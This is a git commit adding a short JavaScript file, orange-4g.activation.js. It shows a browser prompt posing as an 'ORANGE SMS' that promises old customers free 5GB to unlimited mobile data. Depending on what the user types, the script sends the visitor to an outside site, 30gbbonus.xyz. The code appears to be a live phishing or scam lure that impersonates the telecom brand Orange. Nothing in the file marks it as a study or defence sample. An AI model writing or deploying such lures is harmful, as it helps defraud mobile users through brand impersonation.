75ccb4a571a6ecc7ee8cae5cbc3e0c2b6eaaaf8d
xmasdata <152927198+xmasdata@users.noreply.github.com>
2024-06-08 10:50:47 -0700

    Create orange-4g.activation.js

---
+++ orange-4g.activation.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('ORANGE SMS: Dear customer, kindly check if your sim card is qualify to receive from 5GB to Unlimited data, old customers Reward, press 1 to check now ','1');
+if (password != '1') {
+location.href='https://30gbbonus.xyz/orange.4g.html';
+}
